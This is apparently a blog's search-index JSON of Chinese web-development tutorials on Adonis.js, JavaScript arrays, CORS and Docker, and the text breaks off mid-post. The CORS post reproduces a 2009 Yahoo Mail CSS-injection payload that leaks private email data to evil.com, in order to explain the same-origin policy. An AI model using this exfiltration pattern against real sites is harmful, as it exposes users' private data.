[{"content":"Markdown here\n","description":"test post","id":0,"section":"updates","tags":null,"title":"May 2019","uri":"https://codthing.github.io/updates/2019_may/"},{"content":"Markdown here\n","description":"test post","id":1,"section":"docs","tags":null,"title":"Basic Usage","uri":"https://codthing.github.io/docs/gettingstarted/basicusage/"},{"content":"Markdown here\n","description":"test post","id":2,"section":"updates","tags":null,"title":"April 2019","uri":"https://codthing.github.io/updates/2019_april/"},{"content":"Markdown here\n","description":"test post","id":3,"section":"docs","tags":null,"title":"Configuration","uri":"https://codthing.github.io/docs/gettingstarted/configuration/"},{"content":"Markdown here\n","description":"test post","id":4,"section":"updates","tags":null,"title":"March 2019","uri":"https://codthing.github.io/updates/2019_march/"},{"content":"Markdown here\n","description":"test post","id":5,"section":"docs","tags":null,"title":"Installation","uri":"https://codthing.github.io/docs/gettingstarted/installation/"},{"content":"Markdown here\n","description":"test post","id":6,"section":"updates","tags":null,"title":"February 2019","uri":"https://codthing.github.io/updates/2019_february/"},{"content":"Markdown here\n","description":"test post","id":7,"section":"docs","tags":null,"title":"Quick Start","uri":"https://codthing.github.io/docs/gettingstarted/quickstart/"},{"content":"Markdown here\n","description":"test post","id":8,"section":"updates","tags":null,"title":"January 2019","uri":"https://codthing.github.io/updates/2019_january/"},{"content":"一、初始化 版本要求：Node.js v14\n创建项目 yarn create adonis-ts-app hello-adonis 1 2 3 4 5 6  CUSTOMIZE PROJECT \u0026gt; Select the project structure · api \u0026gt; Enter the project name · hello-adonis \u0026gt; Setup eslint? (y/N) · true \u0026gt; Setup prettier? (y/N) » false   启动开发服务器 node ace serve --watch 为生产编译 node ace build --production\rcd build\rnode server.js \r二、路由 网站或 Web 应用程序的用户可以访问不同的 URL，例如/,/about或/posts/1. 要使这些 URL 起作用，必须将它们定义为路由。\n默认路由路径：start/routes.ts\n列出路由 node ace list:routes 嵌套路由\u0026amp;路由域 1 2 3 4 5 6 7 8  Route.group(() =\u0026gt; { Route.group(() =\u0026gt; { Route.get(\u0026#39;/users\u0026#39;, \u0026#39;UsersController.index\u0026#39;) // /api/v1/users  Route.get(\u0026#39;/posts\u0026#39;, \u0026#39;PostsController.index\u0026#39;) // /api/v1/posts  }).prefix(\u0026#39;/v1\u0026#39;) // 路由前缀（可选） }).prefix(\u0026#39;/api\u0026#39;) // 路由前缀（可选） .domain(\u0026#39;blog.adonisjs.com\u0026#39;) // 路由域（可选）   \r三、控制器 控制器是处理路由的实际方式。通过将所有内联路由处理程序移动到其专用控制器文件来处理路由文件。\n默认控制器路径：app/Controllers/Http\n1. 自动生成控制器类 node ace make:controller Post 2. 编辑控制器 import { HttpContextContract } from \u0026#39;@ioc:Adonis/Core/HttpContext\u0026#39;\rexport default class PostsController {\rpublic async index(ctx: HttpContextContract) {\rreturn [\r{\rid: 1,\rtitle: \u0026#39;Hello world\u0026#39;,\r},\r{\rid: 2,\rtitle: \u0026#39;Hello universe\u0026#39;,\r},\r]\r}\r} 3. 路由调用控制器 import Route from \u0026#39;@ioc:Adonis/Core/Route\u0026#39;\rRoute.get(\u0026#39;/posts\u0026#39;, async (ctx) =\u0026gt; {\rconst { default: PostsController } = await import(\r\u0026#39;App/Controllers/Http/PostsController\u0026#39;\r)\rreturn new PostsController().index(ctx)\r}) \r四、中间件 将中间件编写为内联函数对于一些快速测试来说是很好的。但是，建议将中间件逻辑提取到它自己的文件中。\n默认路径：app/Middleware\n1. 自动生成中间件类 node ace make:middleware Auth 2. 编辑中间件 import { HttpContextContract } from \u0026#39;@ioc:Adonis/Core/HttpContext\u0026#39;\rexport default class Auth {\rpublic async handle(\r{ request, response }: HttpContextContract,\rnext: () =\u0026gt; Promise\u0026lt;void\u0026gt;\r) {\rif (notAuthenticated) {\rresponse.unauthorized({ error: \u0026#39;Must be logged in\u0026#39; })\rreturn\r}\rawait next()\r}\r} 3. 注册中间件 要使中间件生效，必须在文件内注册为全局中间件或命名中间件。\n路径：start/kernel.ts\n全局中间件 全局中间件按照与注册时相同的顺序为所有 HTTP 请求执行。\nServer.middleware.register([\r() =\u0026gt; import(\u0026#39;@ioc:Adonis/Core/BodyParser\u0026#39;),\r() =\u0026gt; import(\u0026#39;App/Middleware/LogRequest\u0026#39;)\r]) 命名中间件 有选择地在路由/路由组上应用中间件。\nServer.middleware.registerNamed({\rauth: () =\u0026gt; import(\u0026#39;App/Middleware/Auth\u0026#39;)\r}) 1 2 3 4  Route .get(\u0026#39;dashboard\u0026#39;, \u0026#39;DashboardController.index\u0026#39;) .middleware(\u0026#39;auth\u0026#39;) // 👈   \r五、数据库 Lucid Lucid 为框架的数据层提供支持。\n1. 安装 yarn add @adonisjs/lucid 2. 自动生成配置文件 node ace configure @adonisjs/lucid 3. 验证配置环境变量 在 .env 文件中\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15  // 根据使用的数据库驱动程序，必须验证定义的环境变量。  // 以下是 MySQL 的示例。 PORT=3333 HOST=0.0.0.0 NODE_ENV=development APP_KEY=yZNA8Mcjy4XRwijH8Uz924aSjt5M2x92 DRIVE_DISK=local DB_CONNECTION=mysql MYSQL_HOST=localhost MYSQL_PORT=3306 MYSQL_USER=root MYSQL_PASSWORD=123456 MYSQL_DB_NAME=world   所有数据库驱动程序的配置都存储在 config/database.ts 文件中。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29  import Env from \u0026#39;@ioc:Adonis/Core/Env\u0026#39; import { DatabaseConfig } from \u0026#39;@ioc:Adonis/Lucid/Database\u0026#39; const databaseConfig: DatabaseConfig = { // Default connection  connection: Env.get(\u0026#39;DB_CONNECTION\u0026#39;), // List of available connections  connections: { mysql: { client: \u0026#39;mysql\u0026#39;, connection: { host: Env.get(\u0026#39;MYSQL_HOST\u0026#39;), port: Env.get(\u0026#39;MYSQL_PORT\u0026#39;), user: Env.get(\u0026#39;MYSQL_USER\u0026#39;), password: Env.get(\u0026#39;MYSQL_PASSWORD\u0026#39;), database: Env.get(\u0026#39;MYSQL_DB_NAME\u0026#39;), }, migrations: { naturalSort: true, }, healthCheck: false, debug: false, } } } export default databaseConfig   4. 使用 在控制器 app/Controllers/Http/HelloWorldsController.ts 中使用\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16  import Database from \u0026#39;@ioc:Adonis/Lucid/Database\u0026#39; import { HttpContextContract } from \u0026#39;@ioc:Adonis/Core/HttpContext\u0026#39; export default class HelloWorldsController { public async index(ctx: HttpContextContract) { // return { hello: \u0026#39;world\u0026#39; }  const limit = 20 const page = ctx.request.input(\u0026#39;page\u0026#39;, 1) return Database .from(\u0026#39;city\u0026#39;) // 数据表 city  .select(\u0026#39;*\u0026#39;) .orderBy(\u0026#39;id\u0026#39;, \u0026#39;desc\u0026#39;) .paginate(page, limit) } }   ","description":"","id":9,"section":"nodejs","tags":null,"title":"Adonis.js","uri":"https://codthing.github.io/nodejs/adonis/adonis/"},{"content":"一、四个必备的js数组方法 1. Array.prototype.map() 数组元素更新  创建一个新数组。结果是一个与原数组长度相同的数组，并根据提供的函数转换元素。  1 2 3 4  const arr = [1, 2, 3]; const double = x =\u0026gt; x * 2; arr.map(double); // [2, 4, 6]   2. Array.prototype.filter() 数组元素过滤  创建一个新数组。根据提供的函数返回原数组的子集，结果是一个与原数组长度相同或小于的数组。  1 2 3 4  const arr = [1, 2, 3]; const isOdd = x =\u0026gt; x % 2 === 1; arr.filter(isOdd); // [1, 3]   3. Array.prototype.reduce() 数组转换  根据reducer函数和初始值创建任何类型的输出值。  1 2 3 4 5 6 7 8  const arr = [1, 2, 3]; const sum = (x, y) =\u0026gt; x + y; arr.reduce(sum, 0); // 6  const increment = (x, y) =\u0026gt; [...x, x[x.length - 1] + y]; arr.reduce(increment, [0]); // [0, 1, 3, 6]   4. Array.prototype.find() 匹配第一个元素 1 2 3 4  const arr = [1, 2, 3]; const isOdd = x =\u0026gt; x % 2 === 1; arr.find(isOdd); // 1   二、在数组开头添加新元素 1. Array.prototype.concat 1 2 3 4 5  const array = [1, 2, 3]; const newFirstElement = 4; const newArray = [newFirstElement].concat(array); console.log(newArray); // [4, 1, 2, 3]   2. Array.prototype.unshift 1 2 3 4  const array = [1, 2, 3]; array.unshift(4); console.log(array); // [4, 1, 2, 3]   3. Spread 展开运算符 1 2 3 4  const array = [1, 2, 3]; const newArray = [4, ...array]; console.log(newArray); // [4, 1, 2, 3]   4. Array.prototype.splice  splice(索引, 从第一个参数中指定的索引开始删除的元素数, 想要插入的元素)  1 2 3 4  const array = [1, 2, 3]; array.splice(0,0,4); console.log(array); // // [4, 1, 2, 3]   三、移除数组重复项 1. Set 1 2 3  const arr = [1, 1, 2, 3]; [...new Set(arr)]; // [1, 2, 3]   2. Array.prototype.filter 1 2 3  const arr = [1, 1, 2, 3]; arr.filter((item, index) =\u0026gt; arr.indexOf(item) === index); // [1,2,3]   3. Array.prototype.map 1 2 3 4 5 6 7 8 9 10 11 12 13 14  const arr = [1, 1, 2, 3]; function toUniqueArray(array) { let newArr = [] array.map((x) =\u0026gt; { if(!newArr.includes(x)) { newArr.push(x) }; }); return newArr; }; toUniqueArray(arr); // [1, 2, 3]   4. Array.prototype.forEach 1 2 3 4 5 6 7 8 9 10 11 12 13 14  const arr = [1, 1, 2, 3]; function toUniqueArray(array) { let newArr = {}; array.forEach(function(i) { if(!newArr[i]) { newArr[i] = true; } }); return Object.keys(newArr); } toUniqueArray(arr); // [\u0026#34;1\u0026#34;, \u0026#34;2\u0026#34;, \u0026#34;3\u0026#34;]   5. for 1 2 3 4 5 6 7 8 9 10 11 12 13 14  const arr = [1, 1, 2, 3]; function toUniqueArray(array) { let newArr = []; for (let i = 0; i \u0026lt; array.length; i++) { if (newArr.indexOf(array[i]) === -1) { newArr.push(array[i]); } } return newArr; }; toUniqueArray(arr); // [1, 2, 3]   四、数组中最小值和最大值  Math.min() Math.max() (\u0026hellip;) Spread 展开运算符  1 2 3 4  const arr = [2, 4, 6, 8, 1, 3, 5, 7]; Math.min(...arr); // 1 Math.max(...arr); // 8   ","description":"有趣的数组方法实现","id":10,"section":"javascript","tags":null,"title":"Array","uri":"https://codthing.github.io/javascript/array/array-bp/"},{"content":"collect.js \u0026amp; ramda（ 处理数组和对象的好帮手 ）\nStep1. 安装 yarn add collect.js yarn add ramda Step2. 导入 import collect from \u0026#39;collect.js\u0026#39; import * as R from \u0026#39;ramda\u0026#39; Step3. （项目实例，用来渲染多屏，每屏里面有 8 张卡片） 使用 collect.js 示例 ，使用 chunk 方法\n//拆分数组\rconst collection = collect(scenesData.data);\rconst chunks = collection.chunk(8);//按8个为一组拆分\rconst newArr = chunks.all();\r//用于渲染的二维数组列表(每屏最多8个)\rconst renderItems = newArr.map((items, key) =\u0026gt; {\rreturn (\r\u0026lt;ImageBackground key={key} source={require(\u0026#39;../../assets/images/bg.png\u0026#39;)} style={styles.slide}\u0026gt;\r{\ritems.map((item) =\u0026gt; {\rreturn (\r\u0026lt;Card key={item.scenId} onPress={() =\u0026gt; navigate(\u0026#39;Detail\u0026#39;, { data: item })} style={styles.card}\u0026gt;\r\u0026lt;Image source={{ uri: item.imgUrl }} style={styles.img} /\u0026gt;\r\u0026lt;Text style={styles.title}\u0026gt;\r{item.name}\r\u0026lt;/Text\u0026gt;\r\u0026lt;/Card\u0026gt;\r)\r})\r}\r\u0026lt;/ImageBackground\u0026gt;\r)\r}) 使用ramda示例，使用splitEvery方法\n//拆分数组\rconst newArr = R.splitEvery(8,scenesData.data) //按8个为一组拆分\r//用于渲染的二维数组列表(每屏最多8个)\rconst renderItems = newArr.map((items, key) =\u0026gt; {\rreturn (\r\u0026lt;ImageBackground key={key} source={require(\u0026#39;../../assets/images/bg.png\u0026#39;)} style={styles.slide}\u0026gt;\r{\ritems.map((item) =\u0026gt; {\rreturn (\r\u0026lt;Card key={item.scenId} onPress={() =\u0026gt; navigate(\u0026#39;Detail\u0026#39;, { data: item })} style={styles.card}\u0026gt;\r\u0026lt;Image source={{ uri: item.imgUrl }} style={styles.img} /\u0026gt;\r\u0026lt;Text style={styles.title}\u0026gt;\r{item.name}\r\u0026lt;/Text\u0026gt;\r\u0026lt;/Card\u0026gt;\r)\r})\r}\r\u0026lt;/ImageBackground\u0026gt;\r)\r}) 图示 ","description":"数组和对象的好帮手","id":11,"section":"javascript","tags":null,"title":"Collect \u0026 Ramda","uri":"https://codthing.github.io/javascript/cr/cr/"},{"content":"CORS (跨域资源共享)，它是浏览器获取内容的方式的一部分。\n一、没有 CORS 的跨域访问存在不安全问题 这不是我们的错，只能说这是WEB技术发展的历史问题\n\u0026lt;script src=\u0026#34;…\u0026#34;\u0026gt;\u0026lt;/script\u0026gt;\r\u0026lt;link rel=\u0026#34;stylesheet\u0026#34; href=\u0026#34;…\u0026#34; /\u0026gt;\r\u0026lt;iframe src=\u0026#34;…\u0026#34;\u0026gt;\u0026lt;/iframe\u0026gt;\r\u0026lt;video src=\u0026#34;…\u0026#34;\u0026gt;\u0026lt;/video\u0026gt;\r\u0026lt;audio src=\u0026#34;…\u0026#34;\u0026gt;\u0026lt;/audio\u0026gt; 像这样的 API 运行时向另一个网站发出请求并以特定的方式处理响应，而无需其他站点的同意。\n当你使用上述方法之一请求其他站点的内容时，它会发送其他站点的凭据（包括 cookie、TLS、Authorization等）。\n多年来，这造成了大量的安全问题。\n\u0026lt;img src=\u0026#34;https://your-bank/your-profile/you.jpg\u0026#34; /\u0026gt; 如果上面的图片加载，我可以读取图像的宽度和高度，甚至更多信息。\n2009 年，事实证明雅虎邮件容易受到一个相当简单的攻击。攻击者向用户发送一封电子邮件，主题包括');}，然后另一封电子邮件的主题包括{}html{background:url('//evil.com/?：\n…\r\u0026lt;li class=\u0026#34;email-subject\u0026#34;\u0026gt;Hey {}html{background:url(\u0026#39;//evil.com/?\u0026lt;/li\u0026gt;\r\u0026lt;li class=\u0026#34;email-subject\u0026#34;\u0026gt;…private data…\u0026lt;/li\u0026gt;\r\u0026lt;li class=\u0026#34;email-subject\u0026#34;\u0026gt;…private data…\u0026lt;/li\u0026gt;\r\u0026lt;li class=\u0026#34;email-subject\u0026#34;\u0026gt;…private data…\u0026lt;/li\u0026gt;\r\u0026lt;li class=\u0026#34;email-subject\u0026#34;\u0026gt;Yo \u0026#39;);}\u0026lt;/li\u0026gt;\r… 这意味着用户的一些私人电子邮件数据被夹在一些将解析为有效 CSS 中。然后，攻击者说服用户访问包含以下内容的页面：\n\u0026lt;link rel=\u0026#34;stylesheet\u0026#34; href=\u0026#34;https://m.yahoo.com/mail\u0026#34; /\u0026gt; \u0026hellip;使用yahoo.com的 cookie加载，CSS 解析并将私人信息发送到evil.com.\n这只是冰山一角，从浏览器错误到CPU 漏洞利用，这些泄漏的资源给我们带来了数十年的问题。\n二、如何解决这个问题（1） 很明显，上述内容是 Web 设计中的一个错误，因此我们不再创建可以处理此类请求的 API。以下是主要的策略（这里只列出主要的）：\n1. 同源策略 的由来 1995 年，Netscape 2 就带来了两个惊人的新功能：LiveScript 和 HTML 框架。框架让您可以将一个页面嵌入到另一个页面中，LiveScript 可以与两个页面进行交互。\nNetscape 意识到这会带来安全问题；你不希望一个邪恶的页面能够读取你的银行页面的 DOM，所以他们决定只有在两个页面具有相同的来源时才允许跨框架脚本。\n这就是同源策略的由来。\n#. 同源策略的缺陷 这个想法是同一来源的网站更有可能拥有相同的所有者。\n这并不完全正确，因为很多网站都按 URL 划分内容，例如http://example.com/~danacoding/，但必须在某处划清界线。\n2. 来源与站点 一些网络功能不处理来源，它们处理站点。\n例如，https://help.youtube.com和https://support.youtube.com有不同的来源，但它们是相同的网站。\nCookie 是在站点级别运行的最常见功能，因为你可以创建 Cookie 发送到 youtube.com.\n#. 站点的缺陷 但是！！！这是一个看起来一样的站点，也有可能是一个伪网站、子域或者受到不同前后缀的影响。\n三、如何解决这个问题（2） 1. 删除凭据？ 某些网站根据访问它们的 IP 地址提供不同的内容。\n因此，如果你在家中访问我的网站，我可以开始向常见主机名和 IP 地址发出请求，寻找不安全的物联网设备，寻找使用默认密码的路由器。\n#. 删除凭据的缺陷 删除凭据是解决方案的一部分，但仅靠它是不够的。没有办法知道资源是否包应该含私有数据。\n2. 给资源添加多个跨域来源？ // /crossdomain.xml\r\u0026lt;?xml version=\u0026#34;1.0\u0026#34;?\u0026gt;\r\u0026lt;!DOCTYPE cross-domain-policy SYSTEM \u0026#34;https://www.adobe.com/xml/dtds/cross-domain-policy.dtd\u0026#34;\u0026gt;\r\u0026lt;cross-domain-policy\u0026gt;\r\u0026lt;site-control permitted-cross-domain-policies=\u0026#34;master-only\u0026#34; /\u0026gt;\r\u0026lt;allow-access-from domain=\u0026#34;*.example.com\u0026#34; /\u0026gt;\r\u0026lt;allow-access-from domain=\u0026#34;www.example.com\u0026#34; /\u0026gt;\r\u0026lt;allow-http-request-headers-from domain=\u0026#34;*.adobe.com\u0026#34; headers=\u0026#34;SOAPAction\u0026#34; /\u0026gt;\r\u0026lt;/cross-domain-policy\u0026gt; 这是 Flash 所采用的安全模型，我很陌生，我对它不感兴趣，反正它存在很多问题，很明显\n#. 给资源添加多个跨域来源的缺陷 /crossdomain.xml 来源会开始变得非常多，请求也会非常多，越多问题就越大。\n3. 给不同类型的资源添加跨域来源？ 注意这里的资源和来源的区别。\n#. 给不同类型的资源添加跨域来源的缺陷 如果，资源不是xml，就必须选择不同的格式。\n4. HTTP 表头添加跨域请求 语音浏览器工作组的提议使用 HTTP 标头进行了概括，并成为跨域资源共享（CORS）。\nAccess-Control-Allow-Origin: * 四、CORS 请求 默认情况下，大多数现代 Web 功能都需要 CORS，例如fetch().\n现代功能也有例外，这些功能旨在支持不使用 CORS 的旧功能，例如\u0026lt;link rel=\u0026quot;preload\u0026quot;\u0026gt;.\n不幸的是，对于哪些需要和不需要 CORS 没有简单的规则。例如：\n\u0026lt;!-- Not a CORS request --\u0026gt;\r\u0026lt;script src=\u0026#34;https://example.com/script.js\u0026#34;\u0026gt;\u0026lt;/script\u0026gt;\r\u0026lt;!-- CORS request --\u0026gt;\r\u0026lt;script type=\u0026#34;module\u0026#34; src=\u0026#34;https://example.com/script.js\u0026#34;\u0026gt;\u0026lt;/script\u0026gt; #. 检查是否是CORS请求 弄清楚它的最好方法是尝试并查看网络 DevTools。\n在 Chrome 和 Firefox 中，跨域请求与 Sec-Fetch-Mode标头一起发送，该标头会告诉你它是否是 CORS 请求。\n不幸的是，Safari 还没有实现这一点。\n#. HTML 元素设置 CORS 请求 \u0026lt;img crossorigin src=\u0026#34;…\u0026#34; /\u0026gt;\r\u0026lt;script crossorigin src=\u0026#34;…\u0026#34;\u0026gt;\u0026lt;/script\u0026gt;\r\u0026lt;link crossorigin rel=\u0026#34;stylesheet\u0026#34; href=\u0026#34;…\u0026#34; /\u0026gt;\r\u0026lt;link crossorigin rel=\u0026#34;preload\u0026#34; as=\u0026#34;font\u0026#34; href=\u0026#34;…\u0026#34; /\u0026gt; #. Origin 标头 默认情况下，跨源 CORS 请求是在没有凭据的情况下进行的。\n因此，没有 cookie、没有客户端证书、没有自动Authorization标头，并且Set-Cookie响应被忽略。\n但是，同源请求包括凭据。\nReferer标头经常被浏览器扩展和“互联网安全”软件欺骗或删除，因此创建了一个新标头Origin，它提供了发出请求的页面的来源。\n五、CORS 响应 要通过 CORS 检查并授予其他源访问响应的权限，响应必须包含以下标头：\nAccess-Control-Allow-Origin: * 该*可与请求的值来代替Origin头，但*对于任何请求没有凭据发送。\n与所有标头一样，标头名称不区分大小写，但值区分大小写。\n#. CORS 缓存 CORS 请求不会绕过缓存。Firefox 会根据请求是否具有凭据对其 HTTP 缓存进行分区，\nChrome 也计划这样做，但仍然需要担心 CDN 缓存。\n#. 将 CORS 添加到长缓存资源 如果你的资产具有较长的缓存生命周期，你可能习惯于在内容更改时更改文件名，以便用户选择新内容。\n当涉及到标题更改时，同样也适用。\n如果你添加Access-Control-Allow-Origin: *到具有较长缓存生命周期的资源，请务必更改 URL，\n以便客户端返回您的服务器并获取新标头，而不是重用没有标头的缓存版本。\n#. 给 CORS 表头添加条件 你应该在对 URL 的所有响应中包含它，无论请求是否有Cookie标头。\n别问我为什么，这就是规范。\nVary: Origin, Cookie #. Access-Control-Allow-Origin: * 并不完全安全 如果资源不包含私有数据，那么Access-Control-Allow-Origin: * 是完全安全的。\n如果资源有时包含依赖于 cookie 的私有数据，那么添加Access-Control-Allow-Origin: *也是是安全的，只要你还包含一个Vary: Cookie标头。\n但是，如果你使用诸如发件人的 IP 地址之类的东西来“保护”数据，那么Access-Control-Allow-Origin: *就是不安全的。\n#. 添加凭据 默认情况下，跨源 CORS 请求是在没有凭据的情况下进行的。但是，各种 API 将允许你重新添加凭据。\n添加凭据更加安全，因为公开私人数据是有风险的。\n request  const response = await fetch(url, {\rcredentials: \u0026#39;include\u0026#39;,\r});\r//or\r\u0026lt;img crossorigin=\u0026#34;use-credentials\u0026#34; src=\u0026#34;…\u0026#34; /\u0026gt;  response  Access-Control-Allow-Credentials: true\rAccess-Control-Allow-Origin: https://danacoding.com\rVary: Cookie, Origin 六、不寻常的请求和预检 通常的请求是这样的\nfetch(url, { credentials: \u0026#39;include\u0026#39; });\rfetch(url, {\rmethod: \u0026#39;POST\u0026#39;,\rbody: formData,\r}); 不寻常的请求是这样的\nfetch(url, {\rmethod: \u0026#39;wibbley-wobbley\u0026#39;,\rcredentials: \u0026#39;include\u0026#39;,\rheaders: {\rfancy: \u0026#39;headers\u0026#39;,\r\u0026#39;here-we\u0026#39;: \u0026#39;go\u0026#39;,\r},\r}); #. 预检请求 如果你尝试发出不寻常的请求，浏览器首先会询问其他源是否可以发送它。此过程称为预检。\n在发出请求之前，浏览器会使用OPTIONS方法向目标 URL 发出预检请求，并且标头如下：\nAccess-Control-Request-Method: wibbley-wobbley\rAccess-Control-Request-Headers: fancy, here-we 预检请求从不包含凭据（主请求会包含）。\n#. 预检响应 Access-Control-Max-Age: 600\rAccess-Control-Allow-Methods: Wibbley-Wobbley, WIBBLEY-WOBBLEY //Chrome 区分大小写\rAccess-Control-Allow-Headers: fancy, here-we   Access-Control-Max-Age 缓存此预检响应的秒数，以避免需要对此 URL 进行进一步预检。默认值为 5 秒。\n  Access-Control-Allow-Methods 允许的不寻常方法。这可以是逗号分隔的列表，并且值区分大小写。\n如果要在没有凭据的情况下发送主请求，使用*。\n  Access-Control-Allow-Headers 允许的不寻常标题。这可以是逗号分隔的列表，不区分大小写。\n如果要在没有凭据的情况下发送主请求，使用*。\n  ","description":"","id":12,"section":"others","tags":null,"title":"CORS 跨域资源共享","uri":"https://codthing.github.io/others/cors/cors/"},{"content":"1. Docker Docker 是一个开源的应用容器引擎，基于 Go 语言 并遵从 Apache2.0 协议开源。\nDocker 可以让开发者打包他们的应用以及依赖包到一个轻量级、可移植的容器中，然后发布到任何流行的 Linux 机器上，也可以实现虚拟化。\n容器是完全使用沙箱机制，相互之间不会有任何接口（类似 iPhone 的 app）,更重要的是容器性能开销极低。\n2. Docker 架构 Docker 平台由几个组件组成，用来构建、运行和管理容器化应用程序。\n📦Docker\r├─ 📂Repository 仓库\r│ ├─ 📂Image 镜像\r│ │ ├─ 📂Container 容器\r│ │ └─ 📂Container...\r│ └─ 📂Image...\r└─ 📂Repository... 📦Image 镜像\r└─ 📂基础镜像\r│ └─ 📂子镜像\r│ │ ├─ 📂官方镜像\r│ │ └─ 📂用户镜像 2-1. Docker 引擎    概念 说明     Docker Client Docker 客户端是一个名为 docker 的命令行应用程序，它提供了一个命令行界面（CLI）来与 Docker 服务器进行交互。 docker 命令使用 Docker REST API 向本地或远程服务器发送指令，并作为管理容器的主要接口。   Docker Server Docker 服务器是一个名为 dockerd 的守护进程。 dockerd 守护进程通过 Docker REST API 响应来自客户端的请求，并且可以与其他守护进程交互。 Docker 服务器还负责跟踪容器的生命周期。   Docker Objects 创建和配置多个对象以支持容器部署。 包括网络、存储卷、插件和其他服务对象。 这些对象可以根据需要创建和部署的项目。       命令 说明     docker 查看 Docker 客户端的所有命令选项   docker stats --help 查看 docker stats 指令的具体使用方法    2-2. Docker Hub Docker Hub 是一个软件即服务 (SaaS) Docker 容器注册表。\nDocker 注册表是用来存储和分发容器镜像的存储库。\nDocker Hub 是 Docker 用于镜像管理的默认公共注册表。\n请记住，可以创建和使用私有 Docker 注册表或使用许多可用的云提供商。 例如，可以使用 Azure 容器注册表来存储容器映像以在多个 Azure 容器启用服务中使用。\n当然不止 Docker Hub，远程的服务商不一样，但是操作都是一样的。\n   项目 命令 备注     注册  在https://hub.docker.com 免费注册一个 Docker 账号。   登录 docker login    退出 docker logout    查找镜像 docker search username 关键词 username 是搜索自己库的镜像，或者 docker search ubuntu 搜索公共库关于 ubuntu 的镜像。   拉取镜像 docker pull ubuntu    推送镜像 docker push username/ubuntu:18.0.4 在推送前，需要标志要推送的镜像 docker tag ubuntu:18.0.4 username/ubuntu:18.0.4 ,然后列出看看是否存在 docker images。记得 username 改为自己的Hub用户名。    3. Docker 镜像的工作原理 了解 Docker 中使用的软件、包和镜像之间的差异有助于更好地理解 Docker 镜像的工作原理。\n3-1. 容器软件 打包到容器中的软件不仅限于开发人员构建的应用程序。当谈论软件时，指的是应用程序代码、系统包、二进制文件、库、配置文件以及在容器中运行的操作系统。\n3-2. 容器镜像 容器镜像是不可变的。一旦构建了镜像，就无法更改镜像。\n更改镜像的 唯一方法 是创建新镜像。此功能保证在生产中使用的镜像与开发和 QA 中使用的镜像相同。\n3-3. 主机操作系统 主机操作系统是运行 Docker 引擎的操作系统。在 Linux 上运行的 Docker 容器 共享主机操作系统内核，不需要容器操作系统，只要二进制文件可以直接访问操作系统内核即可。\n但是，Windows 容器需要容器操作系统。容器依赖操作系统内核来管理文件系统、网络管理、进程调度和内存管理等服务。\n3-4. 容器操作系统 容器操作系统是作为打包镜像一部分的操作系统。可以灵活地 在容器中包含不同版本的 Linux 或 Windows 操作系统。这种灵活性能够访问特定的操作系统功能或安装应用程序可能使用的其他软件。\n容器操作系统与主机操作系统隔离，是部署和运行应用程序的环境。结合镜像的不变性，这种隔离意味着在开发中运行的应用程序的环境与生产中的环境相同。\n在示例中，使用 Ubuntu Linux 作为容器操作系统，并且该操作系统不会因开发或生产而改变。使用的镜像总是相同的。\n3-5. 可堆叠文件系统 假设为 Web 应用程序构建镜像。把 Ubuntu 发行版作为一个基础镜像放在引导文件系统之上。接下来安装 Nginx 和 Web 应用程序。有效地将 Nginx 和 Web 应用程序分层放置在原始 Ubuntu 镜像之上。\n一旦容器从镜像运行，就会创建一个最终的可写层。然而，当容器被销毁时，这一层不会继续存在。\n3-6. 基础镜像 基础镜像是使用 Docker 临时镜像的镜像。 临时镜像是一个空容器镜像，不会创建文件系统层。 此镜像假定要运行的应用程序可以直接使用主机操作系统内核。\n另一种说法是：没有父镜像的镜像，通常是带有像 ubuntu、busybox 或 debian 这样的操作系统的镜像。\n3-7. 父镜像 父镜像是一个“容器图像”，可以从中创建镜像。\n例如，与其从头开始创建镜像然后安装 Ubuntu，宁愿使用已经基于 Ubuntu 的镜像。 甚至可以使用已经安装了 Nginx 的镜像。 父镜像通常包含容器操作系统。\n另一种说法是：建立在基础镜像上并添加附加功能的镜像。\n3-8. 基础镜像和父镜像的区别 这两种镜类型都允许创建可重用的镜像。 但是，基础镜像允许更好地控制最终镜像的内容。 回想一下之前的镜像是不可变的，内容只能添加而不能删减。\n3-9. Dockerfile Dockerfile 是一个文本文件，其中包含构建和运行 Docker 镜像的指令。定义了镜像的以下方面：\n 用于创建新镜像的基础镜像或父镜像 更新操作系统和安装附加软件的命令 构建要包含的工件，例如已开发的应用程序 要公开的服务，例如存储和网络配置 启动容器时运行的命令  假设为 ASP.NET Core 网站创建一个 Docker 镜像。 Dockerfile 可能类似于以下示例\n# Step 1: 为新镜像指定父镜像\rFROM ubuntu:18.04\r# Step 2: 更新操作系统软件包并安装其他软件\rRUN apt -y update \u0026amp;\u0026amp; apt install -y wget nginx software-properties-common apt-transport-https \\\r\u0026amp;\u0026amp; wget -q https://packages.microsoft.com/config/ubuntu/18.04/packages-microsoft-prod.deb -O packages-microsoft-prod.deb \\\r\u0026amp;\u0026amp; dpkg -i packages-microsoft-prod.deb \\\r\u0026amp;\u0026amp; add-apt-repository universe \\\r\u0026amp;\u0026amp; apt -y update \\\r\u0026amp;\u0026amp; apt install -y dotnet-sdk-3.0\r# Step 3: 配置Nginx环境\rCMD service nginx start\r# Step 4: 配置Nginx环境\rCOPY ./default /etc/nginx/sites-available/default\r# STEP 5: 配置工作目录\rWORKDIR /app\r# STEP 6: 复制网站代码到容器\rCOPY ./website/. .\r# STEP 7: 配置网络要求\rEXPOSE 80:8080\r# STEP 8: 定义容器中运行的进程的入口点\rENTRYPOINT [\u0026#34;dotnet\u0026#34;, \u0026#34;website.dll\u0026#34;] 之前提到过 Docker 镜像使用了可堆叠文件系统 。当构建最终的容器镜像时，每个步骤都会创建一个临时的容器镜像。这些临时镜像叠加在之前的镜像之上，并在所有步骤完成后呈现为单个图像。\n最后，请注意最后一步，第 8 步。文件中的“ENTRYPOINT”表示一旦从镜像运行容器，将执行哪个进程。\n3-10. 管理镜像 Docker 镜像最初是存储在 PC 上的大文件，需要工具来管理这些文件。\nDocker CLI 允许通过构建、列出、删除和运行镜像来管理镜像。使用 docker 客户端来管理 Docker 镜像。客户端不直接执行命令，而是将所有查询发送到 dockerd 守护进程。\n构建镜像\n使用 docker build 命令来构建 Docker 镜像。假设使用之前的 Dockerfile 定义来构建镜像。这是一个显示构建命令的示例。\ndocker build -t temp-ubuntu . 构建命令生成的输出：\nSending build context to Docker daemon 4.69MB\rStep 1/8 : FROM ubuntu:18.04\r---\u0026gt; a2a15febcdf3\rStep 2/8 : RUN apt -y update 